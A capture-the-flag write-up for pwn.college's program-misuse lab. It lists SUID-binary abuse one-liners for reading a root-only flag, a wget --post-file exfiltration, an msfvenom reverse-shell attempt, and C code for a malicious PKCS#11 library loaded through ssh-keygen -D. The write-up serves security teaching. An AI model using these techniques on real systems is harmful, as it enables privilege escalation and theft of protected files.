
Find a program with SUID bit permission
```bash
$ find / -user root -perm -4000 -print 2>/dev/null 
$ find / -perm -u=s -type f 2>/dev/null 
$ find / -user root -perm -4000 -exec ls -ldb {} \;
```

Program candidates with privilege escalation sample for read only `/flag` permission for root user
```bash
$ env -S cat /flag
$ genisoimage -sort /flag
$ ar -q fake.ar /flag;cat fake.ar
$ echo "/flag" | cpio -o
$ find /flag -exec cat {} \;
$ setarch x86_64 cat /flag
$ whiptail --textbox /flag 10 60
$ tar -cvf fake.tar /flag;tar xf fake.tar -O
$ tar cvf /flag -I; cat flag.tar
$ tar xf /flag -I '/bin/sh -c "cat 1>&2"'
$ socat - /flag
$ cp /flag /dev/stdout
$ mv /usr/bin/cat /usr/bin/mv; mv /flag
$ perl -ne print /flag
$ python -c 'print(open("/flag").read())'
$ bash -p
$ date -f /flag
$ gcc -E -x c /flag
$ bzip2 /flag; bzip2 -dc /flag.bz2
$ unzip -p flag.zip flag | less
$ find . -exec cat /flag {} \;
$ nice cat /flag
$ timeout 1 cat /flag
$ stdbuf -o 0 cat /flag
$ watch -x cat /flag
$ awk 'BEGIN{ while(( getline line<"/flag") > 0 ) { print line } }'
$ sed p /flag
$ dmesg -F /flag
$ wc --files0-from=/flag
$ as /flag
```

`ed`
```bash
$ ed /flag
> p
```

`wget`
```bash
$ nc -lvnp 4554 # terminal session 1
$ wget --post-file=/flag http://127.0.0.1:4554 # terminal session 2
```

`make`
Create a Makefile with the content:
```make
FLAG := $(shell cat /flag) 
ok: 
	echo $(FLAG)
```

```bash
$ make -f Makefile
```

`ruby`
Create a ruby script with the content:
```ruby
readData = File.read("/flag") 
puts readData
```

```bash
$ ruby script.rb
```

`ssh-keygen` ? yes with `-D` parameter to load dynamic shared library

```bash
$ ssh-keygen -D ourlib2shell.so #write ORW dynamic shared library to read the flag
```

My first attempt was to generate a dynamic shared library from `msfvenom`
```bash
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=5100 -f elf-so -o lib2shell.so
```
and run `netcat` to terminal session 2.

```
./lib2shell.so does not contain expected string C_GetFunctionList
provider ./lib2shell.so is not a PKCS11 library
cannot read public key from pkcs11
```

The exploit won't work because `ssh-keygen -D ` expects pkcs11 library (maybe this will work in older version of `ssh`?) and `lib2shell.so` does not really implements pkcs11 interface.

Second attempt, going through [Sean Pesce's Research Blog](https://seanpesce.blogspot.com/2023/03/leveraging-ssh-keygen-for-arbitrary.html)  that applies patches, also `hello.so` won't work so we need to write our own ORW that implements pkcs11 as our third attempt.

Third attempt, I found [jariq's pkcs11 projects](https://stackoverflow.com/a/65446632) , EMPTY-PKCS11 doesn't have `C_GetFunctionList` so I chose his minimal [PCKS11-MOCK](https://github.com/Pkcs11Interop/pkcs11-mock) and modified it to read the `/flag` or we can spawn a root shell.  To make this work modify the `C_Initialize` interface implementation with
```c
...
#include <stdio.h>
#include <unistd.h>
// #define SHELL_COMMAND "/bin/sh"
...

CK_DEFINE_FUNCTION(CK_RV, C_Initialize)(CK_VOID_PTR pInitArgs)
{
    puts("[pkcs11-mock by relro for pwn.college level 51 HARDDDDDDD]");
    printf("Reading the flag");
    // Read the /flag file
    char flag[500];
    FILE *fp;

    fp = fopen("/flag", "r");
    if (fp == NULL) {
        printf("Could not open file /flag");
        return 1;
    }
    fgets(flag, 500, fp);
    printf("Flag: %s\n", flag);

    // long long err = execl(SHELL_COMMAND, "/bin/sh", "-c", SHELL_COMMAND, NULL);
    // printf("Result: %lld\n", err);

    if (CK_TRUE == pkcs11_mock_initialized)
        return CKR_CRYPTOKI_ALREADY_INITIALIZED;
    IGNORE(pInitArgs);
    pkcs11_mock_initialized = CK_TRUE;
    return CKR_OK;
}
```

Then run `build/linux/build.sh` to build our `pkcs11-mock.so` and transfer it to our ssh target remote connection with `scp`.
```bash
$ scp -i key -r pkcs11-mock-x64.so hacker@dojo.pwn.college:/home/hacker/
```

Run the the exploit to the target machine with 
```
hacker@program-misuse-level-51:~$ ssh-keygen -D ./pkcs11-mock-x64.so 
[pkcs11-mock by relro for pwn.college level 51 HARDDDDDDD]
Reading the flag
Flag: pwn.college{you_need_to_perform_this_okay?}

C_GetAttributeValue failed: 18
Enter PIN for 'Pkcs11Interop': 
```

It works, this will work also in your current linux machine with ssh-keygen. You better check your program's permissions and nuke them if needed so.

# References
https://pwn.college/fundamentals/program-misuse
[https://hurricane618.me/2022/05/26/pwn-college-writeup-one/](https://hurricane618.me/2022/05/26/pwn-college-writeup-one/ "https://hurricane618.me/2022/05/26/pwn-college-writeup-one/")
[https://seanpesce.blogspot.com/2023/03/leveraging-ssh-keygen-for-arbitrary.html](https://seanpesce.blogspot.com/2023/03/leveraging-ssh-keygen-for-arbitrary.html "https://seanpesce.blogspot.com/2023/03/leveraging-ssh-keygen-for-arbitrary.html")
https://github.com/Pkcs11Interop/pkcs11-mock
[https://medium.com/@D00MFist/generate-keys-or-generate-dylib-loads-c99ed48f323d](https://medium.com/@D00MFist/generate-keys-or-generate-dylib-loads-c99ed48f323d "https://medium.com/@D00MFist/generate-keys-or-generate-dylib-loads-c99ed48f323d")
https://stackoverflow.com/questions/65444761/how-to-go-about-writing-a-pkcs11-wrapper-around-my-device
